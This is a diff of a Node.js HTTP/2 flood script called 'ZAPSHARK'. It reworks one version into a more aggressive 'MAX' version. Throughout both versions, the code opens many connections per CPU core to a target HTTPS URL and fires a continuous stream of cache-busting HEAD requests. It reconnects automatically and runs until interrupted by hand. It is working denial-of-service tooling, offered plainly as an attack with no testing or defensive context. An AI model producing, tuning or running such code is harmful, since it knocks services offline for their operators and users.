@@ -1,179 +1,149 @@
 const http2 = require('http2');
 const os = require('os');
-const { execSync } = require('child_process');
 
-class ZAPSHARK_V10_TERMINATOR {
+class ZAPSHARK_MAX {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
         this.hostname = new URL(targetUrl).hostname;
         this.totalRequests = 0;
+        this.requestsSinceLastDisplay = 0;
         
-        // CPU CORES - ALL BUT 1
-        this.cpuCores = Math.max(1, os.cpus().length - 1);
+        // CPU CORES
+        this.coreCount = os.cpus().length;
+        this.connectionsPerCore = 8;
+        this.totalConnections = this.coreCount * this.connectionsPerCore;
         
-        // MEMORY OPTIMIZED CONNECTIONS
-        this.clients = new Array(this.cpuCores * 2); // 2 CONNECTIONS PER CORE
+        // MEMORY LEAK PROTECTION
+        this.requestChunkCounter = 0;
+        this.connectionRotations = 0;
         
-        // FIXED ARRAY FOR MEMORY
-        this.activeStreams = 0;
-        this.streamIds = new Set();
+        // CONNECTIONS
+        this.clients = new Array(this.totalConnections);
+        this.connectionTimestamps = new Array(this.totalConnections);
         
-        // NO LOGGING INTERVALS
-        this.attackLoop = null;
+        // SETUP ALL CORES
+        this.initializeAllConnections();
     }
 
-    // === SET CPU AFFINITY ===
-    setCPUAffinity() {
-        try {
-            if (process.platform === 'linux') {
-                // SET NICE LEVEL TO MAX PRIORITY
-                process.setPriority(-20);
-                
-                // SET CPU AFFINITY TO ALL BUT 1 CORE
-                const cpus = os.cpus().length;
-                const mask = (1 << cpus) - 2; // ALL BUT CORE 0
-                execSync(`taskset -p ${mask} ${process.pid}`);
-            }
-        } catch (e) {}
-    }
-
-    // === MEMORY OPTIMIZED CONNECTION POOL ===
-    initializeConnections() {
-        for (let i = 0; i < this.clients.length; i++) {
-            this.createConnection(i);
+    // === INITIALIZE USING ALL CORES ===
+    initializeAllConnections() {
+        for (let i = 0; i < this.totalConnections; i++) {
+            setTimeout(() => {
+                this.createConnection(i);
+            }, i % this.coreCount);
         }
     }
 
     createConnection(index) {
         try {
             const client = http2.connect(this.targetUrl, {
-                maxSessionMemory: 16384, // FIXED MEMORY
-                maxDeflateDynamicTableSize: 4096,
-                peerMaxConcurrentStreams: 500
+                maxSessionMemory: 8192,
+                peerMaxConcurrentStreams: 1000
             });
             
-            // MINIMAL EVENT LISTENERS
-            client.on('error', () => {
-                this.clients[index] = null;
+            client.setMaxListeners(1000);
+            
+            client.on('error', () => {});
+            client.on('close', () => {
                 setTimeout(() => this.createConnection(index), 100);
             });
             
             this.clients[index] = client;
+            this.connectionTimestamps[index] = Date.now();
             
         } catch (err) {
-            this.clients[index] = null;
             setTimeout(() => this.createConnection(index), 100);
         }
     }
 
-    // === MEMORY SAFE ATTACK ===
-    sendRequest() {
-        // ROUND ROBIN THROUGH CLIENTS
-        for (let i = 0; i < this.clients.length; i++) {
-            const client = this.clients[i];
+    // === MEMORY LEAK PROTECTION ===
+    rotateConnections() {
+        this.requestChunkCounter++;
+        this.connectionRotations++;
+        
+        if (this.requestChunkCounter >= 50000) {
+            const now = Date.now();
+            for (let i = 0; i < this.totalConnections; i++) {
+                if (now - this.connectionTimestamps[i] > 30000) {
+                    try {
+                        if (this.clients[i]) {
+                            this.clients[i].destroy();
+                        }
+                    } catch (e) {}
+                    
+                    setTimeout(() => {
+                        this.createConnection(i);
+                    }, Math.random() * 100);
+                }
+            }
+            this.requestChunkCounter = 0;
+        }
+    }
+
+    // === MAX POWER ATTACK ===
+    sendRequests() {
+        this.rotateConnections();
+        
+        const availableConnections = this.clients.filter(c => c).length;
+        const streamsThisTick = Math.min(availableConnections * 100, 5000);
+        
+        for (let i = 0; i < streamsThisTick; i++) {
+            const index = Math.floor(Math.random() * this.totalConnections);
+            const client = this.clients[index];
+            
             if (!client) continue;
 
-            // SEND BATCH FROM EACH CLIENT
-            for (let s = 0; s < 10; s++) {
-                try {
-                    const streamId = Math.random();
-                    this.streamIds.add(streamId);
-                    
-                    const req = client.request({
-                        ':method': 'HEAD',
-                        ':path': '/'
-                    });
-                    
-                    req.on('response', () => {
-                        req.destroy();
-                        this.streamIds.delete(streamId);
-                    });
-                    
-                    req.on('error', () => {
-                        req.destroy();
-                        this.streamIds.delete(streamId);
-                    });
-                    
-                    req.on('close', () => {
-                        this.totalRequests++;
-                        this.streamIds.delete(streamId);
-                        
-                        // LOG OVERWRITE
-                        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
-                    });
-                    
-                    req.end();
-                    
-                } catch (err) {
-                    this.totalRequests++;
-                    process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
-                }
-            }
-        }
-        
-        // MEMORY CLEANUP EVERY 100K REQUESTS
-        if (this.totalRequests % 100000 === 0) {
-            this.cleanupMemory();
-        }
-    }
-
-    // === MEMORY LEAK FIX ===
-    cleanupMemory() {
-        // CLEAN UP STALE STREAMS
-        if (this.streamIds.size > 10000) {
-            this.streamIds.clear();
-        }
-        
-        // RECYCLE DEAD CONNECTIONS
-        for (let i = 0; i < this.clients.length; i++) {
-            const client = this.clients[i];
-            if (client) {
-                try {
-                    if (client.destroyed || client.closed) {
-                        this.clients[i] = null;
-                        this.createConnection(i);
-                    }
-                } catch (e) {
-                    this.clients[i] = null;
-                    this.createConnection(i);
-                }
-            }
-        }
-    }
-
-    // === MAX POWER LOOP ===
-    start() {
-        // SET CPU AFFINITY
-        this.setCPUAffinity();
-        
-        // INIT CONNECTIONS
-        this.initializeConnections();
-        
-        // START ATTACK AFTER 2s
-        setTimeout(() => {
-            // MAXIMUM POSSIBLE LOOP
-            const attack = () => {
-                this.sendRequest();
+            try {
+                const req = client.request({
+                    ':method': 'HEAD',
+                    ':path': '/?' + Date.now()
+                });
                 
-                // DIRECT RECURSION - NO INTERVAL OVERHEAD
-                if (this.attackLoop !== false) {
-                    setImmediate(attack);
-                }
-            };
-            
-            this.attackLoop = true;
-            attack();
-            
-        }, 2000);
+                req.on('response', () => {});
+                req.on('error', () => {});
+                req.on('close', () => {
+                    this.totalRequests++;
+                    this.requestsSinceLastDisplay++;
+                });
+                
+                req.end();
+                
+            } catch (err) {
+                this.totalRequests++;
+                this.requestsSinceLastDisplay++;
+            }
+        }
+        
+        // DISPLAY UPDATE
+        if (this.requestsSinceLastDisplay >= 1000 || Math.random() < 0.01) {
+            process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
+            this.requestsSinceLastDisplay = 0;
+        }
+    }
+
+    // === RUN FOREVER ===
+    start() {
+        // ATTACK ON ALL CORES
+        const attackInterval = setInterval(() => {
+            for (let i = 0; i < this.coreCount; i++) {
+                this.sendRequests();
+            }
+        }, 0.1);
+        
+        // MEMORY CLEANUP
+        const cleanupInterval = setInterval(() => {
+            if (global.gc) {
+                global.gc();
+            }
+        }, 30000);
         
         // MANUAL STOP ONLY
         process.on('SIGINT', () => {
-            this.attackLoop = false;
+            clearInterval(attackInterval);
+            clearInterval(cleanupInterval);
             
-            for (let client of this.clients) {
-                if (client) {
-                    try { client.destroy(); } catch (e) {}
-                }
+            for (const client of this.clients) {
+                try { client?.destroy(); } catch (e) {}
             }
             
             process.exit(0);
@@ -181,15 +151,9 @@ class ZAPSHARK_V10_TERMINATOR {
     }
 }
 
-// USAGE
+// START
 const target = process.argv[2];
-if (!target || !target.startsWith('https://')) {
-    process.exit(1);
-}
+if (!target?.startsWith('https://')) process.exit(1);
 
-// MAX NODE PERFORMANCE
-process.env.UV_THREADPOOL_SIZE = os.cpus().length * 2;
-if (global.gc) global.gc();
-
-const shark = new ZAPSHARK_V10_TERMINATOR(target);
+const shark = new ZAPSHARK_MAX(target);
 shark.start();
